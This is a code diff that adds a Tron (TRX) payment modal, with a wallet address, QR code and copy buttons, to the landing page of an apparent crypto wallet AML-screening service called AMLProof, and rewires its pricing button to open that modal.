@@ -335,6 +335,37 @@
   </div>
 </div>
 
+<!-- ═══ TRX PAYMENT MODAL ══════════════════════════════════ -->
+<div class="modal-overlay" id="trxModal" onclick="trxBgClick(event)">
+  <div class="modal-box">
+    <button class="modal-close" onclick="closeTrxModal()">✕</button>
+    <div style="font-size:2.4rem;margin-bottom:10px">🔴</div>
+    <h3 style="font-size:1.2rem;font-weight:800;margin-bottom:6px">Pay with Tron (TRX)</h3>
+    <p style="color:var(--muted);font-size:.82rem;line-height:1.6;margin-bottom:18px">
+      Send exactly <strong style="color:var(--accent);font-family:'Space Mono',monospace">30 TRX</strong> to the address below.<br>Your wallet check will run automatically after confirmation.
+    </p>
+    <div id="trxQrWrap" style="background:#fff;border-radius:12px;padding:14px;display:inline-block;margin-bottom:16px;">
+      <div id="trxQrcode"></div>
+    </div>
+    <div style="background:rgba(0,229,255,.05);border:1px solid var(--border);border-radius:8px;padding:12px 14px;margin-bottom:14px;">
+      <div style="font-size:.68rem;color:var(--muted);font-family:'Space Mono',monospace;letter-spacing:.08em;margin-bottom:6px;text-transform:uppercase;">TRC-20 / TRX Address</div>
+      <div id="trxAddrDisplay" style="font-family:'Space Mono',monospace;font-size:.72rem;color:var(--accent);word-break:break-all;line-height:1.6;">TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax</div>
+    </div>
+    <div style="display:flex;gap:8px;margin-bottom:18px;">
+      <button class="copy-btn" style="flex:1;" onclick="copyTrxAddr()">📋 Copy Address</button>
+      <button class="copy-btn" style="flex:1;" onclick="copyTrxAmount()">📋 Copy Amount</button>
+    </div>
+    <div style="background:rgba(255,179,0,.06);border:1px solid rgba(255,179,0,.2);border-radius:8px;padding:12px 14px;margin-bottom:6px;text-align:left;">
+      <div style="font-size:.78rem;color:var(--warn);font-weight:700;margin-bottom:6px;">⚠ Important</div>
+      <ul style="list-style:none;font-size:.76rem;color:var(--muted);line-height:1.9;">
+        <li>✅ Only send <strong style="color:var(--text)">TRX</strong> on the <strong style="color:var(--text)">Tron (TRC-20)</strong> network</li>
+        <li>✅ Send exactly <strong style="color:var(--text)">30 TRX</strong> — other amounts may not be processed</li>
+        <li>✅ Do <strong style="color:var(--text)">not</strong> send BEP-20, ERC-20 or any other network</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
 <!-- ═══ NAV ═══════════════════════════════════════════════ -->
 <nav>
   <a href="#" class="nav-logo">🔍 <span>AMLProof</span></a>
@@ -471,7 +502,7 @@
   <p class="ssub">Affordable AML screening to protect your business from hidden risks.</p>
   <div class="pricing-grid">
     <div class="price-card"><div style="font-size:2rem;margin:20px 0 8px">🔷</div><div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Ethereum</div><div class="pval">0.0002 ETH</div><div class="punit">per wallet check</div><ul class="pfeat"><li>Full AML risk score</li><li>Sanctions list screening</li><li>Transaction history flags</li><li>PDF compliance report</li></ul><button class="btn-card btn-ol" onclick="openModal()">Check with ETH</button></div>
-    <div class="price-card featured"><div class="ftd-badge">Most Popular</div><div style="font-size:2rem;margin:20px 0 8px">🔴</div><div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Tron</div><div class="pval">30 TRX</div><div class="punit">per check — Fast</div><ul class="pfeat"><li>Full AML risk score</li><li>Sanctions list screening</li><li>Transaction history flags</li><li>PDF compliance report</li><li>Priority processing</li></ul><button class="btn-card btn-pr" onclick="openModal()">Check with TRX</button></div>
+    <div class="price-card featured"><div class="ftd-badge">Most Popular</div><div style="font-size:2rem;margin:20px 0 8px">🔴</div><div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Tron</div><div class="pval">30 TRX</div><div class="punit">per check — Fast</div><ul class="pfeat"><li>Full AML risk score</li><li>Sanctions list screening</li><li>Transaction history flags</li><li>PDF compliance report</li><li>Priority processing</li></ul><button class="btn-card btn-pr" onclick="openTrxModal()">Pay 30 TRX → Check Now</button></div>
     <div class="price-card"><div style="font-size:2rem;margin:20px 0 8px">🟡</div><div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Volume Plan</div><div class="pval">Custom</div><div class="punit">for business clients</div><ul class="pfeat"><li>Bulk wallet screening</li><li>API integration</li><li>White-label reports</li><li>Dedicated support</li></ul><a href="#" class="btn-card btn-ol">Contact Sales</a></div>
   </div>
 </section>
@@ -779,7 +810,50 @@ function toggleFaq(el) {
   if (!was) it.classList.add('open');
 }
 
-/* ── Scroll reveal ──────────────────────────────── */
+/* ── TRX Payment Modal ──────────────────────────── */
+const TRX_ADDRESS = 'TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax';
+const TRX_AMOUNT  = '30';
+let trxQrDone = false;
+
+function openTrxModal() {
+  document.getElementById('trxModal').classList.add('open');
+  if (!trxQrDone) {
+    new QRCode(document.getElementById('trxQrcode'), {
+      text        : TRX_ADDRESS,
+      width       : 200,
+      height      : 200,
+      colorDark   : '#000000',
+      colorLight  : '#ffffff',
+      correctLevel: QRCode.CorrectLevel.M
+    });
+    trxQrDone = true;
+  }
+}
+
+function closeTrxModal() {
+  document.getElementById('trxModal').classList.remove('open');
+}
+
+function trxBgClick(e) {
+  if (e.target === document.getElementById('trxModal')) closeTrxModal();
+}
+
+function copyTrxAddr() {
+  navigator.clipboard.writeText(TRX_ADDRESS).then(() => {
+    const btns = document.querySelectorAll('#trxModal .copy-btn');
+    btns[0].textContent = '✅ Copied!';
+    setTimeout(() => btns[0].textContent = '📋 Copy Address', 2000);
+  });
+}
+
+function copyTrxAmount() {
+  navigator.clipboard.writeText(TRX_AMOUNT).then(() => {
+    const btns = document.querySelectorAll('#trxModal .copy-btn');
+    btns[1].textContent = '✅ Copied!';
+    setTimeout(() => btns[1].textContent = '📋 Copy Amount', 2000);
+  });
+}
+
 const io = new IntersectionObserver(es => es.forEach(e => {
   if (e.isIntersecting) { e.target.style.opacity='1'; e.target.style.transform='translateY(0)'; }
 }), { threshold: 0.1 });
